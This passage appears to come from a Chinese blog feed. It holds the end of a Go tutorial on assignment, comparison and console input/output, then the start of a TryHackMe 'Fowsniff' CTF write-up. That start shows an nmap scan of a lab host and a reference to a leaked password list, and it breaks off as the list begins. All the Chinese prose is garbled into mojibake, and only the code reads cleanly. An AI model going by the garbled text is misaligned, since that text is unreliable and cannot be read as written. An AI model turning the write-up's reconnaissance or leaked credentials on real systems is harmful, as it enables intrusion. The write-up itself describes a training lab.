ä¸­ï¼Œæ‰€æœ‰åœ¨å‡½æ•°ä¸­çš„å˜é‡éƒ½å¿…é¡»è¦è¢«ä½¿ç”¨ï¼Œå¦‚æœåªæ˜¯å£°æ˜äº†å˜é‡ï¼Œæ²¡æœ‰ä½¿ç”¨å®ƒå°±ä¼šæŠ¥é”™ï¼Œä½†ä»…é€‚ç”¨äºå‡½æ•°å†…çš„å˜é‡ï¼Œå¯¹äºå‡½æ•°å¤–çš„åŒ…çº§å˜é‡æ— ç”¨ã€‚</p><h2 id="åŒ¿å"><a href="#åŒ¿å" class="headerlink" title="åŒ¿å"></a>åŒ¿å</h2><p>ç”¨ <code>_</code> å¯ä»¥è¡¨ç¤ºä¸éœ€è¦æŸä¸€ä¸ªå˜é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Open(name <span class="hljs-type">string</span>) (*File, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚ <code>os.Open</code> å‡½æ•°æœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼Œæˆ‘ä»¬åªæƒ³è¦ç¬¬ä¸€ä¸ªï¼Œä¸æƒ³è¦ç¬¬äºŒä¸ªï¼Œå¯ä»¥æŒ‰ç…§ä¸‹é¢è¿™æ ·å†™</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, _ := os.Open(<span class="hljs-string">&quot;readme.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœªä½¿ç”¨çš„å˜é‡æ˜¯æ— æ³•é€šè¿‡ç¼–è¯‘çš„ï¼Œå½“ä½ ä¸éœ€è¦æŸä¸€ä¸ªå˜é‡æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ <code>_</code> ä»£æ›¿ã€‚</p><h2 id="äº¤æ¢"><a href="#äº¤æ¢" class="headerlink" title="äº¤æ¢"></a>äº¤æ¢</h2><p>åœ¨ go ä¸­ï¼Œå¦‚æœæƒ³è¦äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œä¸éœ€è¦ä½¿ç”¨æŒ‡é’ˆï¼Œå¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ç›´æ¥è¿›è¡Œäº¤æ¢ï¼Œè¯­æ³•ä¸Šçœ‹èµ·æ¥éå¸¸ç›´è§‚ï¼Œä¾‹å­å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span><br>num1, num2 = num2, num1<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªå˜é‡ä¹Ÿæ˜¯å¦‚æ­¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2, num3 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span>, <span class="hljs-number">22</span><br>num1, num2, num3  = num3, num2, num1<br></code></pre></td></tr></table></figure><p>go é‡Œé¢æœ‰ä¸€ä¸ªç‰¹åˆ«æœ‰æ„æ€çš„è§„åˆ™ï¼Œè¿›è¡Œå¤šä¸ªå˜é‡èµ‹å€¼è¿ç®—æ—¶ï¼Œå®ƒçš„é¡ºåºæ˜¯å…ˆè®¡ç®—å€¼å†èµ‹å€¼ï¼Œä¸æ˜¯ä»å·¦åˆ°å³è®¡ç®—ï¼Œè¿™å°±å’Œå…¶ä»–è¯­è¨€å¤§ç›¸å¾„åº­äº†ã€‚æ¯”å¦‚è¯´ä¸‹é¢çš„ä¾‹å­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, a+b<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ç­”æ¡ˆæ˜¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å®ƒä¼šå°† a, b, c ä¸‰ä¸ªæ•°çš„å€¼åˆ†åˆ«è®¡ç®—å¥½å†èµ‹ç»™å®ƒä»¬ï¼Œå°±ç­‰åŒäºä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å½“æ¶‰åŠåˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œè¿™ä¸ªæ•ˆæœå°±æ›´æ˜æ˜¾ï¼Œæœ‰ä¸€ä¸ªå‡½æ•°<code>sum</code>å¯ä»¥è®¡ç®—ä¸¤ä¸ªæ•°å­—çš„è¿”å›å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>  <span class="hljs-keyword">return</span> a + b<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡å‡½æ•°æ¥è¿›è¡Œä¸¤æ•°ç›¸åŠ </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, sum(a, b)<br></code></pre></td></tr></table></figure><p>ç»“æœæ²¡æœ‰å˜åŒ–ï¼Œå› ä¸ºåœ¨è®¡ç®—<code>sum</code>å‡½æ•°è¿”å›å€¼æ—¶ï¼Œå®ƒä¼ å…¥çš„å‚æ•°ä¾æ—§æ˜¯ 0 å’Œ 1</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ä»£ç åº”è¯¥å†™æˆè¿™æ ·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b = b, c<br>c = a + b<br></code></pre></td></tr></table></figure><h2 id="æ¯”è¾ƒ"><a href="#æ¯”è¾ƒ" class="headerlink" title="æ¯”è¾ƒ"></a>æ¯”è¾ƒ</h2><p>å˜é‡ä¹‹é—´çš„æ¯”è¾ƒæ—¶å®ƒä»¬çš„ç±»å‹å¿…é¡»ç›¸åŒï¼Œgo è¯­è¨€ä¸­ä¸å­˜åœ¨éšå¼ç±»å‹è½¬æ¢ï¼Œåƒä¸‹é¢è¿™æ ·çš„ä»£ç ç¼–è¯‘æ˜¯æ— æ³•é€šè¿‡çš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(a == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¿…é¡»ä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(<span class="hljs-type">int64</span>(a) == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>min </code>å‡½æ•°æ¯”è¾ƒæœ€å°å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">minVal := min(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.2</span>)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>max</code> å‡½æ•°æ¯”è¾ƒæœ€å¤§å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">maxVal := max(<span class="hljs-number">100</span>, <span class="hljs-number">22</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.12</span>)<br></code></pre></td></tr></table></figure><p>å®ƒä»¬çš„å‚æ•°æ”¯æŒæ‰€æœ‰çš„å¯æ¯”è¾ƒç±»å‹ï¼Œgo ä¸­çš„å¯æ¯”è¾ƒç±»å‹æœ‰</p><ul><li>å¸ƒå°”</li><li>æ•°å­—</li><li>å­—ç¬¦ä¸²</li><li>æŒ‡é’ˆ</li><li>é€šé“ ï¼ˆä»…æ”¯æŒåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼‰</li><li>å…ƒç´ æ˜¯å¯æ¯”è¾ƒç±»å‹çš„æ•°ç»„ï¼ˆåˆ‡ç‰‡ä¸å¯æ¯”è¾ƒï¼‰ï¼ˆä»…æ”¯æŒåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼‰ï¼ˆä»…æ”¯æŒç›¸åŒé•¿åº¦çš„æ•°ç»„é—´çš„æ¯”è¾ƒï¼Œå› ä¸ºæ•°ç»„é•¿åº¦ä¹Ÿæ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸åŒç±»å‹ä¸å¯æ¯”è¾ƒï¼‰</li><li>å­—æ®µç±»å‹éƒ½æ˜¯å¯æ¯”è¾ƒç±»å‹çš„ç»“æ„ä½“ï¼ˆä»…æ”¯æŒåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼‰</li></ul><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡å¯¼å…¥æ ‡å‡†åº“ <code>cmp</code> æ¥åˆ¤æ–­ï¼Œä¸è¿‡ä»…æ”¯æŒæœ‰åºç±»å‹çš„å‚æ•°ï¼Œåœ¨ go ä¸­å†…ç½®çš„æœ‰åºç±»å‹åªæœ‰æ•°å­—å’Œå­—ç¬¦ä¸²ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;cmp&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  cmp.Compare(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>  cmp.Less(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h2><p>å‡½æ•°å†…éƒ¨å¯ä»¥é€šè¿‡èŠ±æ‹¬å·å»ºç«‹ä¸€ä¸ªä»£ç å—ï¼Œå½¼æ­¤ä¹‹é—´çš„å˜é‡ä½œç”¨åŸŸæ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¸å—å¹²æ‰°ï¼Œæ— æ³•è®¿é—®ï¼Œä½†æ˜¯ä¼šå—åˆ°çˆ¶å—ä¸­çš„å½±å“ã€‚</p><h1 id="è¾“å…¥è¾“å‡º"><a href="#è¾“å…¥è¾“å‡º" class="headerlink" title="è¾“å…¥è¾“å‡º"></a>è¾“å…¥è¾“å‡º</h1><h2 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   Stdin  = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdin), <span class="hljs-string">&quot;/dev/stdin&quot;</span>)<br>   Stdout = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdout), <span class="hljs-string">&quot;/dev/stdout&quot;</span>)<br>   Stderr = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stderr), <span class="hljs-string">&quot;/dev/stderr&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p>åœ¨ <code>os</code> åŒ…ä¸‹æœ‰ä¸‰ä¸ªå¤–æš´éœ²çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå…¶ç±»å‹éƒ½æ˜¯ <code>*os.File</code> ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">os.Stdinæ ‡å‡†è¾“å…¥<br>os.Stdoutæ ‡å‡†è¾“å‡º<br>os.Stderræ ‡å‡†é”™è¯¯<br></code></pre></td></tr></table></figure><h2 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h2><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>åƒè¯»æ–‡ä»¶ä¸€æ ·ï¼ˆéº»çƒ¦ï¼‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> buf [<span class="hljs-number">1024</span>]<span class="hljs-type">byte</span><br>  n, _ := os.Stdin.Read(buf[:])<br>  os.Stdout.Write(buf[:n])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt </code>åŒ…æä¾›äº†å‡ ä¸ªå‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// æ‰«æä»os.Stdinè¯»å…¥çš„æ–‡æœ¬ï¼Œæ ¹æ®ç©ºæ ¼åˆ†éš”ï¼Œæ¢è¡Œä¹Ÿè¢«å½“ä½œç©ºæ ¼</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scan</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// ä¸Scanç±»ä¼¼ï¼Œä½†æ˜¯é‡åˆ°æ¢è¡Œåœæ­¢æ‰«æ</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanln</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// æ ¹æ®æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²æ‰«æ</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>è¯»å–ä¸¤ä¸ªæ•°å­—</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>  fmt.Scanln(&amp;a, &amp;b)<br>  fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»å–å›ºå®šé•¿åº¦çš„æ•°ç»„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  n := <span class="hljs-number">10</span><br>  s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, n)<br>  <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> n &#123;<br>    fmt.Scan(&amp;s[i])<br>  &#125;<br>  fmt.Println(s)<br>&#125;<br><br>&gt;&gt; <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br>&gt;&gt; [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><h3 id="bufio"><a href="#bufio" class="headerlink" title="bufio"></a>bufio</h3><p>æœ‰å¤§é‡è¾“å…¥è¦è¯»å–çš„æ—¶å»ºè®®ä½¿ç”¨ <code>bufio.Reader</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    reader := bufio.NewReader(os.Stdin)<br>    <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>    fmt.Fscanln(reader, &amp;a, &amp;b)<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h3><p>ä¸ <code>bufio.Reader</code>  ç±»ä¼¼ï¼Œä¸è¿‡å®ƒæŒ‰è¡Œè¯»å–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  scanner := bufio.NewScanner(os.Stdin)<br>  <span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>    line := scanner.Text()<br>    <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;exit&quot;</span> &#123;<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;scan&quot;</span>, line)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span><br>scan <span class="hljs-number">1</span><br><span class="hljs-number">2</span><br>scan <span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>scan <span class="hljs-number">3</span><br>exit<br></code></pre></td></tr></table></figure><h2 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h2><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>å¯ä»¥ç›´æ¥å°†å­—ç¬¦ä¸²å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºä¸­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>os.Stdout.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="print-println"><a href="#print-println" class="headerlink" title="print&#x2F;println"></a>print&#x2F;println</h3><p>go ä¸­ä¸¤ä¸ªå†…ç½®çš„å‡½æ•° <code>print</code>ï¼Œ<code>println</code>ï¼Œä»–ä»¬ä¼šå°†å‚æ•°è¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯ä¸­ï¼Œä»…åšè°ƒè¯•ç”¨ï¼Œä¸€èˆ¬ä¸æ¨èä½¿ç”¨</p><h3 id="fmt-1"><a href="#fmt-1" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt</code> åŒ…æä¾›äº† <code>fmt.Println</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°é»˜è®¤ä¼šå°†å‚æ•°è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚å®ƒçš„å‚æ•°<strong>æ”¯æŒä»»æ„ç±»å‹</strong>ï¼Œå¦‚æœç±»å‹å®ç°äº† <code>String</code> æ¥å£ä¹Ÿä¼šè°ƒç”¨ <code>String </code>æ–¹æ³•æ¥è·å–å…¶å­—ç¬¦ä¸²è¡¨ç°å½¢å¼ï¼Œæ‰€ä»¥å®ƒè¾“å‡ºçš„å†…å®¹å¯è¯»æ€§æ¯”è¾ƒé«˜ï¼Œé€‚ç”¨äºå¤§éƒ¨åˆ†æƒ…å†µï¼Œä¸è¿‡ç”±äºå†…éƒ¨ç”¨åˆ°äº†åå°„ï¼Œåœ¨æ€§èƒ½æ•æ„Ÿçš„åœºæ™¯ä¸å»ºè®®å¤§é‡ä½¿ç”¨ã€‚</p><h3 id="bufio-1"><a href="#bufio-1" class="headerlink" title="bufio"></a>bufio</h3><p><code>bufio </code>æä¾›äº†å¯ç¼“å†²çš„è¾“å‡ºæ–¹æ³•ï¼Œå®ƒä¼šå…ˆå°†æ•°æ®å†™å…¥åˆ°å†…å­˜ä¸­ï¼Œç§¯ç´¯åˆ°äº†ä¸€å®šé˜ˆå€¼å†è¾“å‡ºåˆ°æŒ‡å®šçš„ <code>Writer</code> ä¸­ï¼Œé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯ <code>4KB</code>ï¼Œåœ¨æ–‡ä»¶ IOï¼Œç½‘ç»œ IO çš„æ—¶å€™ä½¿ç”¨æ¯”è¾ƒå¥½ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  writer := bufio.NewWriter(os.Stdout)<br>  <span class="hljs-keyword">defer</span> writer.Flush()<br>  writer.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ ¼å¼åŒ–"><a href="#æ ¼å¼åŒ–" class="headerlink" title="æ ¼å¼åŒ–"></a>æ ¼å¼åŒ–</h3><p>go ä¸­çš„æ ¼å¼åŒ–è¾“å‡ºåŠŸèƒ½åŸºæœ¬ä¸Šç”± <code>fmt.Printf</code> å‡½æ•°æä¾›ï¼Œè·Ÿ C è¯­è¨€å·®ä¸å¤šã€‚åœ¨ <code>%</code> ä¸æ ¼å¼åŒ–åŠ¨è¯ä¹‹é—´åŠ ä¸Šä¸€ä¸ªç©ºæ ¼èƒ½è¾¾åˆ°åˆ†éš”ç¬¦çš„æ•ˆæœã€‚</p>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Fowsniff CTF</title>
    <link href="/2025/01/21/Fowsniff/"/>
    <url>/2025/01/21/Fowsniff/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æœ‰ç‚¹å·æ‡’äº†owo </p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>å…ˆç”¨ nmap æ‰«ä¸€ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T4 --min-rate <span class="hljs-number">1000</span> -sC -sV -p- <span class="hljs-number">10.10.108.176</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6fe50794710c00b6.png"></p><p>å¼€æ”¾äº† 22ã€80ã€110ã€143 è¿™4 ä¸ªç«¯å£</p><p>è®¿é—®ä¸€ä¸‹å‘ç°äº†ä¸€ä¸ªåå« Fowsniff Corp çš„å…¬å¸ï¼Œå¾€ä¸‹ç¿»è¿˜èƒ½çœ‹è§ä¸€æ¡å‘Šç¤ºï¼Œå¤§æ¦‚æ„æ€æ˜¯ï¼š@fowsniffcorp Twitter è´¦æˆ·è¢«åŠ«æŒäº†ï¼Œä¸Šé¢å¯èƒ½ä¼šæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å»æœä¸€ä¸‹ã€‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/24fa594eb2e4976d.png"></p><p>è°·æ­Œæœäº†ä¸€ä¸‹ï¼Œçœ‹æè¿°æ‰¾åˆ°äº† twitter å‘å¸ƒçš„ï¼Œç‚¹è¿›å»å‘ç°å¦‚ä¸‹ï¼Œæœ‰ä¸€ä¸ªé“¾æ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/372908be9f9378be.png"></p><p>é“¾æ¥è¿›å»å‘ç°å·²ç»è¢«ä¸‹çº¿äº†ï¼Œåªèƒ½çœ‹ WP çš„ä¿¡æ¯äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/ec0ed336c8d9d0f9.png"></p><p>ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs applescript">FOWSNIFF CORP PASSWORD LEAK<br>            &#x27;&#x27;~``<br>           ( o o )<br>+<span 